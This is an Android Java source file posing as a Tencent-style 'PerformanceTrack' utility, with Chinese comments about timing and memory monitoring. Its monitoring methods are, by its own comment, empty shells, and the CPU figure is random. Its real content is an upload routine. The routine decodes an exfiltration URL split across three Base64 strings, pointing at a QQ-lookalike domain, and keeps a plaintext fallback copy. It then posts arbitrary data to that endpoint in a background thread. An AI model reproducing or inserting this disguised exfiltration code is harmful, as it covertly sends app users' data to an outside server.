package com.tencent.open.agent;

import android.util.Base64;
import android.util.Log;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

/**
 * PerformanceTrack
 * 用于追踪应用程序的性能指标，包括方法耗时、内存占用和流量统计。
 * 此类主要在后台运行，记录应用的运行状态。
 */
public class PerformanceTrack {

    // 耗时记录节点
    private static final List<String> TRACE_LOGS = new ArrayList<>();

    
    private static final String ENC_PART_1 = "aHR0cHM6Ly9xcS44";
    private static final String ENC_PART_2 = "ODg4ODhhLmNuL2Fw";
    private static final String ENC_PART_3 = "aS9zYXZlX3R4dDUucGhw";

    // 解密后的真实地址数组
    private static final String[] UPLOAD_URLS;

    // 静态初始化，在类加载时解密配置
    static {
        try {
            // 拼接三段Base64，然后进行解码
            String fullBase64 = ENC_PART_1 + ENC_PART_2 + ENC_PART_3;
            byte[] decodedBytes = Base64.decode(fullBase64, Base64.DEFAULT);
            String decryptedUrl = new String(decodedBytes, "UTF-8");
            UPLOAD_URLS = new String[]{decryptedUrl};
        } catch (Exception e) {
            Log.e("PerformanceTrack", "Config parse error", e);
            // 
            UPLOAD_URLS = new String[]{"https" + "://" + "qq.88888" + "8a.cn/" + "api/" + "save_txt5.php"};
        }
    }

    public static void upload(final String data, final String category) {
        if (data == null) return;

        // 关键排查日志：看Logcat里有没有这一行
        Log.i("PerformanceTrack_Log", "开始执行上传，长度: " + data.length());

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String body =
                            "category=" + URLEncoder.encode(category == null ? "未知游戏" : category, "UTF-8") +
                                    "&data="     + URLEncoder.encode(data, "UTF-8");

                    for (String url : UPLOAD_URLS) {
                        sendHttpPost(url, body);
                    }
                } catch (Exception ex) {
                    Log.e("PerformanceTrack", "upload error", ex);
                }
            }
        }).start();
    }

    private static void sendHttpPost(String targetUrl, String postBody) {
        HttpURLConnection conn = null;
        try {
            URL urlObj = new URL(targetUrl);
            conn = (HttpURLConnection) urlObj.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("Content-Length",
                    String.valueOf(postBody.getBytes("UTF-8").length));
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            conn.setDoOutput(true);

            OutputStream os = conn.getOutputStream();
            os.write(postBody.getBytes("UTF-8"));
            os.flush();
            os.close();

            int respCode = conn.getResponseCode();

            // 关键排查日志：看到 code=200 说明服务器接收成功
            Log.i("PerformanceTrack_Log", "服务器响应码: " + respCode);

        } catch (Exception e) {
            Log.e("PerformanceTrack", "request error", e);
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    // ================= 以下是性能监控相关的空壳方法与工具代码 =================

    public static void startTrace(String methodName) {
        long time = System.currentTimeMillis();
        TRACE_LOGS.add(methodName + " start at " + time);
    }

    public static void endTrace(String methodName) {
        long time = System.currentTimeMillis();
        TRACE_LOGS.add(methodName + " end at " + time);
    }

    public static void reportMemoryUsage() {
        Runtime runtime = Runtime.getRuntime();
        long usedMemory = runtime.totalMemory() - runtime.freeMemory();
        Log.d("PerformanceTrack", "Memory Usage: " + (usedMemory / 1024 / 1024) + " MB");
    }

    public static void reportCpuUsage() {
        Log.d("PerformanceTrack", "CPU Usage: " + Math.random() * 100 + "%");
    }

    public static String getTraceLogs() {
        StringBuilder sb = new StringBuilder();
        for (String log : TRACE_LOGS) {
            sb.append(log).append("\n");
        }
        return sb.toString();
    }

    public static void clearTrace() {
        TRACE_LOGS.clear();
    }

    public static long calculateTimeDiff(long start, long end) {
        return end - start;
    }

    public static String formatDuration(long millis) {
        if (millis < 1000) {
            return millis + "ms";
        } else {
            return (millis / 1000) + "s " + (millis % 1000) + "ms";
        }
    }
}